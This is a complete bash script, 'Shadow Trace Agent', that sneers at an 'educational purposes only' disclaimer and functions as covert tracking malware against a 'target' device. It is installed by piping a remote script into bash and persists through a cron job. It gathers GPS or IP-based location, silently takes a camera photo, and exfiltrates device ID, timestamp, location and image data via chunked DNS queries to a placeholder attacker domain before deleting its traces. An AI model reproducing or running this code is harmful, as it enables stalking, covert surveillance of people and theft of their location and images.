#!/bin/bash
# Shadow Trace Agent v1.0 — Educational purposes only, bitch.
# Install on target: curl -sL your-domain.com/agent.sh | bash

# Persistence (cron every 5 min)
echo "*/5 * * * * /bin/bash /tmp/.shadow/run.sh" | crontab -
mkdir -p /tmp/.shadow

# Gather data
IP=$(curl -s ifconfig.me)  # Laptop fallback
if command -v termux-location &> /dev/null; then
    # Android via Termux
    LOC=$(termux-location -p gps -r once 2>/dev/null)
    LAT=$(echo "$LOC" | grep latitude | awk '{print $2}' | tr -d ',')
    LON=$(echo "$LOC" | grep longitude | awk '{print $2}' | tr -d ',')
    GEODATA="GPS:$LAT,$LON"
else
    # Laptop geolocation via IP
    GEO=$(curl -s "http://ip-api.com/json/$IP")
    LAT=$(echo "$GEO" | jq -r .lat)
    LON=$(echo "$GEO" | jq -r .lon)
    GEODATA="IPGeo:$LAT,$LON"
fi

# Take pic if possible (laptop: webcamshot, termux: termux-camera-photo)
if command -v termux-camera-photo &> /dev/null; then
    termux-camera-photo -c 0 /tmp/.shadow/snap.jpg
elif command -v webcamshot &> /dev/null; then
    webcamshot /tmp/.shadow/snap.jpg
fi

# Base64 encode photo (if exists) for sending
if [ -f /tmp/.shadow/snap.jpg ]; then
    PICB64=$(base64 -w0 /tmp/.shadow/snap.jpg | head -c 200)  # first 200 chars enough for demo
else
    PICB64="NOPIC"
fi

# Prepare payload: deviceid|timestamp|geodata|picfragment
DEVID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "unknown")
TS=$(date +%s)
PAYLOAD="${DEVID}|${TS}|${GEODATA}|${PICB64}"

# Send over DNS (chunked if long)
DOMAIN="track.your-domain.com"  # <-- CHANGE THIS
HOST=$(echo "$PAYLOAD" | xxd -p | tr -d '\n')
# Max DNS label length 63, so we split
while [ -n "$HOST" ]; do
    CHUNK=$(echo "$HOST" | cut -c1-60)
    HOST=$(echo "$HOST" | cut -c61-)
    dig +short "${CHUNK}.${DOMAIN}"
done

# Wipe traces
rm -rf /tmp/.shadow 2>/dev/null